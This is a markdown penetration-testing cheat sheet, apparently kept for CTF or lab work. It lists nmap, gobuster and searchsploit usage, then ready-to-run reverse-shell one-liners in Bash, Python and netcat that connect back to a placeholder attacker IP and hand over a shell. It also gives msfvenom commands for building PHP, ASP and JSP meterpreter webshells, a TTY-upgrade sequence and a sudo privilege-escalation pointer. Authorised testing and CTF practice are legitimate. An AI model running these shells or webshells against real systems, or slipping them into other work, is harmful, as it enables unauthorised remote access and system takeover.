## Port scanning
### Nmap
* `nmap -sC -sV -oA <FILENAME> <TARGETIP>`
  * Default script, version detection, output to file 
  * [Explanation](https://www.cleancss.com/explain-command/nmap/4068984)


## Enumeration
### Directories
* `gobuster dir -u http://<SERVER> -o dirs.txt -w ~/links/dirlist.txt`
  * [Documentation](https://github.com/OJ/gobuster)
* [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)

  
## Exploits
### Searchsploit
* Simple search - `searchsploit <KEYWORD>`
* Exploit details - `searchsploit -x <PATH>`
* Copy exploit - `searchsploit -m <PATH>`

### Websites
* [exploit-db.com](https://www.exploit-db.com/)

## Reverse shells
### Listen for connections
* `nc –nlvp <PORT>`
    * [Explanation](https://www.cleancss.com/explain-command/index.php?string=nc+-l+-v+-p)
### Shell
* Bash - `bash -c "bash -i >& /dev/tcp/<ATTACKERIP>/<ATTACKERPORT> 0>&1"`
* Python - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKERIP>",<ATTACKERPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
* Netcat - `nc -nv <ATTACKERIP> <ATTACKERPORT> -e /bin/sh`

### Webshells
* `msfvenom -p <PAYLOAD> LHOST=<ATTACKERIP> LPORT=<ATTACKERPORT> -f raw > example.<EXT>`
  * PHP - `php/meterpreter_reverse_tcp`
  * ASP - `windows/meterpreter/reverse_tcp`
  * JSP - `java/jsp_shell_reverse_tcp`
* Kali - `/usr/share/webshells/` (ASP, ASPX, CFM, JSP, PERL, PHP)

### TTY shell
1. Open netcat session
2. `python -c 'import pty; pty.spawn("/bin/bash")'`
3. `export TERM=xterm`
4. `CTRL+Z`
5. `stty raw -echo`
6. `fg`

[Other methods of spawning a TTY Shell](https://netsec.ws/?p=337)

## Privilege escalation
### Sudo pwnage
* Commands executable as root - `sudo -l`
  * `(root) NOPASSWD: /usr/bin/vi /var/www/html/*`
  
[Basic cheat sheet](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

## Useful websites
* Explain linux commands - [cleancss.com/explain-command/](https://www.cleancss.com/explain-command/)
* Default router settings - [cleancss.com/router-default/](https://www.cleancss.com/router-default/)